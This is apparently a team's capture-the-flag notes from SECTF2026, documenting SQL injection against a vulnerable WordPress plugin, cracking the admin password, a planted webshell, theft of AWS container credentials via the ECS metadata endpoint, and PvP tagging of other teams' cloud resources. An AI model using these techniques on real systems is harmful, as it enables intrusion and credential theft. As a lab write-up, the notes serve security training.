# CTF – "You Play the CTF. We Play Defense" — SECTF2026
**Event:** XPRO @ Talent Arena Barcelona, March 2 2026
**Org:** Schneider Electric
**Target:** `https://0x06.0ffsec.com/` (note: 0ffsec with zero, not O)
**Team code:** 0x06
**Scoreboard:** `http://ctf.0ffsec.com:8888/`
**Flag format:** `{slsctf2024_...}`

---

## PHASE 1 — COMPLETE ✅ (6,600 pts)

**WordPress 6.9.1** site ("RENTAL PLATFORM") with vulnerable plugin `web-directory-free` v1.6.9.

**Exploit:** CVE-2024-3552 — Unauthenticated SQLi via:
```
POST /wp-admin/admin-ajax.php
action=w2dc_get_map_marker_info&locations_ids[0]=INJECTION&map_id=1
```
`locations_ids[]` array values concatenated raw into SQL. Error-based extraction with EXTRACTVALUE. Quotes escaped by WP addslashes — use **hex encoding** (e.g. `0x25736C7363746625` for `%slsctf%`).

**Flags submitted:**
1. `admin_pwd_hash` (2500pts): `$P$BjsebVsiO1ydy3eyxspzo.UdpQUwcx.`
2. `bonus_flag` (100pts): `{slsctf2024_flags_follow_this_pattern}` — base64 in robots.txt
3. `hidden_db_flag` (4000pts): `{slsctf2024_EspionageMissionComplete}` — extracted from wp_options via SQLi

---

## PHASE 2 — "CIA - Inside the beast" ✅ COMPLETE

**Mission:** You have the admin password hash. Log into WordPress admin panel. Execute malicious PHP code. Read a file from `/opt` directory. Extract the flag.

**Flag:** `opt_file_flag` (2000pts) — "What's the message inside this file?"
**Difficulty:** Medium

### Attack Plan
1. **Log into wp-admin** — need to crack the admin hash or change it via SQLi
   - Stacked queries (`;UPDATE`) don't work on MariaDB
   - Could use SQLi to extract/forge a password reset token
   - Could use SQLi to UPDATE via a subquery trick
2. **Execute PHP** — once in wp-admin, common methods:
   - Theme Editor → edit a PHP file (e.g. 404.php)
   - Plugin Editor → inject PHP into a plugin file
   - Upload a malicious plugin ZIP
   - Install a plugin that allows code execution
3. **Read `/opt` directory** — `scandir('/opt')` then `file_get_contents()`

### Key Info
- WP_DEBUG is ON (SQL queries leak in AJAX responses)
- Apache/2.4.66 (Debian), PHP 8.3.30
- MariaDB backend
- Only user: admin (ID=1)
- SQLi endpoint still works for any DB queries needed

### Result
- **Admin password:** `SIMONE` (cracked with john + rockyou.txt in <1 sec)
- **Webshell:** `https://0x06.0ffsec.com/wp-content/plugins/hello.php?c=CMD&r=FILE&d=DIR`
- **File:** `/opt/data.nan` (base64-encoded flag)
- **Flag:** `{slsctf2024_OperationInfiltrationSuccess}` (2000pts)

### Tools
- `~/tmp/ctf/tools/sqlmap/` — sqlmap
- `~/tmp/ctf/tools/wdf/` — vulnerable plugin source (1.6.9)
- `~/tmp/ctf/tools/wdf170/` — fixed plugin source (1.7.0)
- brew: john, hashcat, gobuster, hydra, ffuf

---

## PHASE 3 — "CIA - Unveiling the Syndicate's Secret" ✅ COMPLETE

**Mission:** WP runs on a cloud provider (AWS). Gather intel. Find private S3 buckets containing messages (PDFs). Extract the flag.

**Flag:** `pdf_doc_flag` (4000pts) — `{slsctf2024_cloud_environment_pwn3d}`
**Difficulty:** Medium

### Attack Chain
1. **Webshell** → `env | grep aws` → found ECS Fargate (not EC2, so no IMDS)
2. **ECS creds endpoint:** `curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` → got IAM AccessKeyId/SecretAccessKey/Token
3. **`aws s3 ls`** → found `infected-bucket-533267321410` with `dpkg-log-2024-05-13.pdf`
4. **Downloaded PDF** → 7-page dpkg install log with base64 flag hidden in a "message" line
5. **Decoded:** `e3Nsc2N0ZjIwMjRfY2xvdWRfZW52aXJvbm1lbnRfcHduM2R9` → `{slsctf2024_cloud_environment_pwn3d}`

### AWS Details
- **Region:** us-east-1
- **Account:** 533267321410
- **RDS host:** team0x06.cv8m8qmeannp.us-east-1.rds.amazonaws.com:3306
- **Execution env:** AWS_ECS_FARGATE
- **S3 buckets of interest:** ctf2024-0x06 (empty), infected-bucket-533267321410 (had the PDF)
- **ECS creds URI:** `/v2/credentials/21d5d4d9-7c16-4a1f-9edc-bd67639d2381`
- **AWS CLI on box:** `/usr/local/bin/aws`

---

## PHASE 4 — "CIA - Conquer the game" ✅ COMPLETE

**Mission:** Tag all other teams' containers with your team code to earn extra points. PvP mode!

**Mechanic:**
- Use AWS tag: `Name=hacked Value=0x06` on other teams' resources
- Other teams can do the same to you
- Points accumulate until end of game

**Flag:** 1 flag, name "none", 0pts shown (likely dynamic scoring based on tags)
**Hint:** 1 available, costs 300pts

### Attack Plan
1. **Get fresh IAM creds** from ECS endpoint (tokens expire — previous ones expired at 12:03:26Z)
2. **Enumerate other teams' resources** — we can see all S3 buckets already (ctf2024-0x01 through 0x21)
3. **Find taggable resources:**
   - ECS tasks/services/clusters
   - EC2 instances (if any)
   - S3 buckets
   - RDS instances (pattern: `team0x0N.cv8m8qmeannp.us-east-1.rds.amazonaws.com`)
4. **Apply tag** `Name=hacked Value=0x06` to every other team's resources
5. Commands to try via webshell:
   ```
   aws ecs list-clusters
   aws ecs list-services --cluster <cluster>
   aws ecs list-tasks --cluster <cluster>
   aws ec2 describe-instances
   aws rds describe-db-instances
   aws resourcegroupstaggingapi get-resources
   ```

### Result ✅
- **All 20 other teams tagged!** (0x01-0x05, 0x07-0x21)
- Tags: `Key=Name,Value=hacked` + `Key=Value,Value=0x06`
- Resource type: App Runner services (`aws apprunner tag-resource`)
- Script: `~/tmp/ctf/tag_all.py` — can re-run to re-tag if others overwrite
- No access to: EC2, RDS, S3 tagging, ECS, resource-groups-tagging API
- Other teams may overwrite our tags — re-run periodically!

### Key Assets (carried from Phase 3)
- **Webshell:** `https://0x06.0ffsec.com/wp-content/plugins/hello.php?c=CMD`
- **AWS CLI:** `/usr/local/bin/aws` on the container
- **All team buckets visible:** ctf2024-0x01 through ctf2024-0x21
- **WP admin:** `admin:SIMONE`
- **Auth cookies:** `~/tmp/ctf/jar.txt`
